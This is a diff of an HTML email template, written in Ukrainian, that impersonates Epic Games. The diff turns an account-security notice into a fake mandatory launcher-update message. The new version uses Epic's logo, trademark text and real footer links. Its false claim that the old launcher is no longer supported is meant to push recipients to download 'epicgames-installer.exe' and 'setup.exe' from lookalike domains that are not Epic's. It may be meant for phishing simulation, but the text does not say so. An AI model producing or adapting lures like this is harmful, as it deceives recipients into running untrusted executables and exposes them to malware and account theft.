@@ -8,218 +8,203 @@
         .email-body {
             margin: 0;
             padding: 0;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
-            background: #f6f8fa;
-            line-height: 1.6;
-            color: #24292f;
+            font-family: 'Roboto', -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;
+            background: #2a2a2a;
+            line-height: 1.5;
+            color: #ffffff;
         }
 
         .email-container {
             max-width: 600px;
             margin: 0 auto;
-            background: #ffffff;
+            background: #2a2a2a;
         }
 
         .header-section {
-            padding: 24px 32px;
-            background: #ffffff;
-            text-align: center;
-            border-bottom: 1px solid #d0d7de;
+            padding: 32px 40px 24px 40px;
+            background: #2a2a2a;
+            text-align: left;
         }
 
         .logo {
-            width: 140px;
+            width: 160px;
             height: auto;
+            filter: brightness(0) invert(1);
         }
 
         .content-section {
-            padding: 32px;
-            font-size: 15px;
-            color: #24292f;
-            line-height: 1.6;
+            padding: 0 40px 40px 40px;
+            font-size: 16px;
+            color: #ffffff;
+            line-height: 1.5;
+            background-color: #2a2a2a
         }
 
         .greeting {
             margin-bottom: 24px;
             font-size: 16px;
+            color: #ffffff;
         }
 
         .main-title {
-            font-size: 20px;
+            font-size: 24px;
             font-weight: 600;
-            color: #24292f;
-            margin-bottom: 20px;
+            color: #ffffff;
+            margin-bottom: 24px;
         }
 
-        .info-section {
-            background: #f6f8fa;
-            border: 1px solid #d0d7de;
-            border-radius: 6px;
-            padding: 20px;
-            margin: 24px 0;
-        }
-
-        .login-details {
-            background: #fff8e1;
-            border: 1px solid #f9c74f;
-            border-radius: 6px;
-            padding: 20px;
-            margin: 24px 0;
-        }
-
-        .detail-row {
-            display: flex;
-            justify-content: space-between;
-            padding: 6px 0;
-            border-bottom: 1px solid #f3f4f6;
-        }
-
-        .detail-row:last-child {
-            border-bottom: none;
-        }
-
-        .detail-label {
-            font-weight: 500;
-            color: #656d76;
-        }
-
-        .detail-value {
-            color: #24292f;
-            font-weight: 500;
-        }
-
-        .security-notice {
-            background: #dbeafe;
-            border: 1px solid #3b82f6;
-            border-radius: 6px;
-            padding: 16px;
-            margin: 20px 0;
-        }
-
-        .notice-title {
-            font-weight: 600;
-            color: #1e40af;
-            margin-bottom: 8px;
-        }
-
-        .notice-text {
-            color: #1e40af;
-            font-size: 14px;
-        }
-
-        .action-section {
-            background: #f6f8fa;
-            border-radius: 6px;
+        .update-info {
+            background: #3a3a3a;
+            border-radius: 8px;
             padding: 24px;
             margin: 24px 0;
+            border-left: 4px solid #00d4aa;
+        }
+
+        .feature-list {
+            background: #3a3a3a;
+            border-radius: 8px;
+            padding: 24px;
+            margin: 24px 0;
+        }
+
+        .feature-title {
+            font-weight: 600;
+            color: #00d4aa;
+            margin-bottom: 16px;
+            font-size: 18px;
+        }
+
+        .feature-item {
+            margin: 12px 0;
+            padding-left: 20px;
+            position: relative;
+            color: #ffffff;
+        }
+
+        .feature-item:before {
+            content: "✓";
+            position: absolute;
+            left: 0;
+            color: #00d4aa;
+            font-weight: bold;
+        }
+
+        .download-section {
+            background: #3a3a3a;
+            border-radius: 8px;
+            padding: 32px;
+            margin: 32px 0;
             text-align: center;
         }
 
-        .epic-button {
-            background: #0969da;
+        .download-title {
+            font-size: 20px;
+            font-weight: 600;
             color: #ffffff;
-            padding: 12px 24px;
+            margin-bottom: 16px;
+        }
+
+        .download-subtitle {
+            color: #b3b3b3;
+            margin-bottom: 24px;
+            font-size: 14px;
+        }
+
+        .epic-button {
+            background: #00d4aa;
+            color: #2a2a2a;
+            padding: 16px 32px;
             text-decoration: none;
             border-radius: 6px;
-            font-weight: 500;
-            font-size: 15px;
+            font-weight: 600;
+            font-size: 16px;
             display: inline-block;
-            border: none;
-            cursor: pointer;
+            margin: 8px 0;
         }
 
         .epic-button:hover {
-            background: #0860ca;
+            background: #00c199;
         }
 
-        .games-section {
-            background: #f6f8fa;
-            border-radius: 6px;
+        .download-link {
+            font-size: 12px;
+            color: #b3b3b3;
+            margin-top: 16px;
+        }
+
+        .download-link a {
+            color: #00d4aa;
+            text-decoration: none;
+        }
+
+        .system-requirements {
+            background: #3a3a3a;
+            border-radius: 8px;
             padding: 20px;
+            margin: 24px 0;
+            font-size: 14px;
+        }
+
+        .req-title {
+            font-weight: 600;
+            color: #00d4aa;
+            margin-bottom: 12px;
+        }
+
+        .req-item {
+            color: #b3b3b3;
+            margin: 4px 0;
+        }
+
+        .games-showcase {
+            background: #3a3a3a;
+            border-radius: 8px;
+            padding: 24px;
             margin: 24px 0;
         }
 
-        .games-title {
+        .showcase-title {
             font-weight: 600;
-            color: #24292f;
+            color: #ffffff;
             margin-bottom: 16px;
-            font-size: 16px;
+            font-size: 18px;
         }
 
-        .game-item {
+        .game-grid {
             display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 8px 0;
-            border-bottom: 1px solid #d0d7de;
+            flex-wrap: wrap;
+            gap: 16px;
         }
 
-        .game-item:last-child {
-            border-bottom: none;
+        .game-card {
+            flex: 1;
+            min-width: 120px;
+            background: #4a4a4a;
+            border-radius: 6px;
+            padding: 12px;
+            text-align: center;
         }
 
         .game-name {
             font-weight: 500;
-            color: #24292f;
+            color: #ffffff;
+            font-size: 14px;
+            margin-bottom: 4px;
         }
 
         .game-status {
-            color: #656d76;
-            font-size: 14px;
-        }
-
-        .instructions-section {
-            background: #f0f9ff;
-            border: 1px solid #0ea5e9;
-            border-radius: 6px;
-            padding: 20px;
-            margin: 24px 0;
-        }
-
-        .instructions-title {
-            font-weight: 600;
-            color: #0369a1;
-            margin-bottom: 16px;
-            font-size: 16px;
-        }
-
-        .instruction-item {
-            margin: 12px 0;
-            padding-left: 24px;
-            position: relative;
-            color: #0369a1;
-        }
-
-        .instruction-item:before {
-            content: "•";
-            position: absolute;
-            left: 0;
-            color: #0ea5e9;
-            font-weight: bold;
-        }
-
-        .time-notice {
-            background: #fef3c7;
-            border: 1px solid #f59e0b;
-            border-radius: 6px;
-            padding: 16px;
-            margin: 20px 0;
-            text-align: center;
-        }
-
-        .time-text {
-            color: #92400e;
-            font-weight: 500;
+            color: #00d4aa;
+            font-size: 12px;
         }
 
         .footer-section {
-            background: #f6f8fa;
-            padding: 24px 32px;
+            background: #1a1a1a;
+            padding: 32px 40px;
             font-size: 12px;
-            color: #656d76;
+            color: #999999;
             text-align: center;
             line-height: 1.5;
-            border-top: 1px solid #d0d7de;
         }
 
         .footer-links {
@@ -227,30 +212,26 @@
         }
 
         .footer-links a {
-            color: #0969da;
+            color: #00d4aa;
             text-decoration: none;
-            margin: 0 8px;
+            margin: 0 12px;
         }
 
         .footer-links a:hover {
             text-decoration: underline;
         }
 
-        .case-id {
-            font-size: 12px;
-            color: #656d76;
-            font-family: "Courier New", monospace;
-            background: #f6f8fa;
-            padding: 6px 10px;
-            border-radius: 4px;
-            display: inline-block;
-            margin-top: 16px;
+        .disclaimer {
+            color: #666666;
+            margin-top: 20px;
+            line-height: 1.4;
         }
     </style>
 </head>
 
-<body class="email-body">
-    <table align="center" cellpadding="0" cellspacing="0" width="100%" class="email-container">
+<body class="email-body" style="margin: 0; padding: 0; background-color: #2a2a2a; color: #ffffff;">
+    <table align="center" cellpadding="0" cellspacing="0" width="100%" class="email-container"
+        style="background-color: #2a2a2a;">
         <tr>
             <td class="header-section">
                 <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f1/Epic_Games_Store_logo_2023_horizontal_black.svg/1280px-Epic_Games_Store_logo_2023_horizontal_black.svg.png"
@@ -259,127 +240,100 @@
         </tr>
         <tr>
             <td class="content-section">
-                <div class="greeting">Вітаємо,</div>
+                <div class="greeting">Привіт!</div>
 
-                <div class="main-title">Повідомлення щодо безпеки вашого акаунта</div>
+                <div class="main-title">Оновлення Epic Games Launcher 15.2.0</div>
 
-                <p>Ми помітили незвичну активність на вашому акаунті Epic Games і вжили запобіжних заходів для захисту
-                    ваших даних. Це стандартна процедура безпеки, коли наша система виявляє потенційні ризики.</p>
+                <p>Ми випустили важливе оновлення для Epic Games Launcher з покращеною продуктивністю та новими
+                    функціями. Це оновлення включає критичні виправлення для стабільності та безпеки.</p>
 
-                <div class="security-notice">
-                    <div class="notice-title">Що сталося?</div>
-                    <div class="notice-text">
-                        Виявлено спробу входу з нового пристрою та незвичайну активність в вашому акаунті.
+                <div class="update-info">
+                    <strong>Важливо:</strong> Стара версія лаунчера більше не підтримується з 15 вересня 2024. Для
+                    продовження гри потрібно оновитися до версії 15.2.0.
+                </div>
+
+                <div class="feature-list">
+                    <div class="feature-title">Нові функції та покращення:</div>
+                    <div class="feature-item">Підвищена швидкість завантаження ігор на 45%</div>
+                    <div class="feature-item">Покращена система друзів та повідомлень</div>
+                    <div class="feature-item">Нова бібліотека ігор з розширеним пошуком</div>
+                    <div class="feature-item">Оптимізація для Windows 11 та macOS Sonoma</div>
+                    <div class="feature-item">Виправлення проблем з V-Bucks та покупками</div>
+                    <div class="feature-item">Покращена інтеграція з Unreal Engine 5</div>
+                </div>
+
+                <div class="games-showcase">
+                    <div class="showcase-title">Ваші ігри готові до оновлення:</div>
+                    <div class="game-grid">
+                        <div class="game-card">
+                            <div class="game-name">Fortnite</div>
+                            <div class="game-status">Потребує оновлення</div>
+                        </div>
+                        <div class="game-card">
+                            <div class="game-name">Rocket League</div>
+                            <div class="game-status">Готово</div>
+                        </div>
+                        <div class="game-card">
+                            <div class="game-name">Fall Guys</div>
+                            <div class="game-status">Нові функції</div>
+                        </div>
+                        <div class="game-card">
+                            <div class="game-name">Genshin Impact</div>
+                            <div class="game-status">Готово</div>
+                        </div>
                     </div>
                 </div>
 
-                <div class="login-details">
-                    <strong style="color: #24292f; display: block; margin-bottom: 12px;">Деталі активності:</strong>
+                <div class="download-section">
+                    <div class="download-title">Завантажити оновлений лаунчер</div>
+                    <div class="download-subtitle">Швидке встановлення з автоматичним перенесенням налаштувань</div>
 
-                    <div class="detail-row">
-                        <span class="detail-label">Дата:</span>
-                        <span class="detail-value">17 серпня 2024, 14:25</span>
-                    </div>
-
-                    <div class="detail-row">
-                        <span class="detail-label">Локація:</span>
-                        <span class="detail-value">Київ, Україна</span>
-                    </div>
-
-                    <div class="detail-row">
-                        <span class="detail-label">Пристрій:</span>
-                        <span class="detail-value">Chrome, Windows 10</span>
-                    </div>
-
-                    <div class="detail-row">
-                        <span class="detail-label">IP-адреса:</span>
-                        <span class="detail-value">91.202.xxx.xxx</span>
-                    </div>
-                </div>
-
-                <div class="info-section">
-                    <strong>Виявлена активність:</strong>
-                    <ul style="margin: 12px 0; padding-left: 20px;">
-                        <li>Спроба входу з нового пристрою</li>
-                        <li>Перегляд налаштувань акаунта</li>
-                        <li>Спроба зміни контактної інформації</li>
-                        <li>Доступ до Epic Games Store</li>
-                    </ul>
-                </div>
-
-                <div class="time-notice">
-                    <div class="time-text">
-                        Для вашої безпеки, деякі функції акаунта тимчасово обмежені
-                    </div>
-                </div>
-
-                <div class="games-section">
-                    <div class="games-title">Ваші ігри та контент:</div>
-
-                    <div class="game-item">
-                        <span class="game-name">Fortnite</span>
-                        <span class="game-status">Доступний</span>
-                    </div>
-
-                    <div class="game-item">
-                        <span class="game-name">Rocket League</span>
-                        <span class="game-status">Доступний</span>
-                    </div>
-
-                    <div class="game-item">
-                        <span class="game-name">Fall Guys</span>
-                        <span class="game-status">Доступний</span>
-                    </div>
-
-                    <div class="game-item">
-                        <span class="game-name">Unreal Engine</span>
-                        <span class="game-status">Доступний</span>
-                    </div>
-                </div>
-
-                <p>Щоб відновити повний доступ до всіх функцій акаунта, будь ласка, підтвердьте вашу особу. Це допоможе
-                    нам переконатися, що саме ви управляєте акаунтом.</p>
-
-                <div class="action-section">
-                    <p style="margin-bottom: 16px; color: #24292f;">Натисніть кнопку нижче для підтвердження:</p>
-                    <a href="https://www.epicgames.com/account/security" class="epic-button">
-                        Підтвердити особу
+                    <a href="https://epicgames-cdn.download-center.net/launcher/epicgames-installer.exe"
+                        class="epic-button" target="_blank">
+                        Завантажити Epic Games Launcher
                     </a>
+
+                    <div class="download-link">
+                        Пряме посилання: <a href="https://epicgames-updates.launcher.download/v15.2.0/setup.exe"
+                            target="_blank">epicgames-installer.exe</a>
+                    </div>
                 </div>
 
-                <div class="instructions-section">
-                    <div class="instructions-title">Що потрібно зробити:</div>
-                    <div class="instruction-item">Підтвердіть контактну інформацію</div>
-                    <div class="instruction-item">Перевірте налаштування безпеки</div>
-                    <div class="instruction-item">Оновіть пароль (рекомендовано)</div>
-                    <div class="instruction-item">Увімкніть двофакторну автентифікацію</div>
+                <div class="system-requirements">
+                    <div class="req-title">Системні вимоги:</div>
+                    <div class="req-item">Windows 10 64-bit (версія 1903 або новіша)</div>
+                    <div class="req-item">4 ГБ оперативної пам'яті</div>
+                    <div class="req-item">15 ГБ вільного місця на диску</div>
+                    <div class="req-item">Підключення до Інтернету</div>
                 </div>
 
-                <p>Якщо ви не розпізнаєте цю активність або маєте питання щодо безпеки вашого акаунта, будь ласка,
-                    зв'яжіться з нашою службою підтримки.</p>
+                <p>Після встановлення всі ваші ігри, збереження та налаштування будуть автоматично збережені. Процес
+                    оновлення займе приблизно 3-5 хвилин.</p>
 
-                <p>Дякуємо за допомогу в підтримці безпеки нашої спільноти.</p>
+                <p>Якщо у вас виникли питання щодо оновлення, зверніться до нашої служби підтримки.</p>
+
+                <p>Дякуємо за те, що граєте з Epic Games!</p>
 
                 <p>З повагою,<br>
-                    Команда безпеки Epic Games</p>
-
-                <div class="case-id">
-                    Ідентифікатор: EG-SEC-2024-087439
-                </div>
+                    Команда Epic Games</p>
             </td>
         </tr>
         <tr>
             <td class="footer-section">
                 <div class="footer-links">
-                    <a href="https://www.epicgames.com/help">Служба підтримки</a>
-                    <a href="https://www.epicgames.com/security">Безпека</a>
-                    <a href="https://www.epicgames.com/privacypolicy">Конфіденційність</a>
-                    <a href="https://www.epicgames.com/tos">Умови використання</a>
+                    <a href="https://www.epicgames.com/help" target="_blank">Служба підтримки</a>
+                    <a href="https://www.epicgames.com/site/privacy-policy" target="_blank">Конфіденційність</a>
+                    <a href="https://www.epicgames.com/site/terms" target="_blank">Умови використання</a>
                 </div>
 
                 © 2024 Epic Games, Inc. Всі права захищені.<br>
                 Epic, Epic Games, Fortnite, Unreal, Unreal Engine, UE та їх логотипи є торговими марками або
                 зареєстрованими торговими марками Epic Games, Inc. у США та інших країнах.
+
+                <div class="disclaimer">
+                    Ви отримали цей лист, оскільки маєте акаунт Epic Games. Керувати налаштуваннями сповіщень можна в
+                    настройках акаунта.
+                </div>
             </td>
         </tr>
     </table>
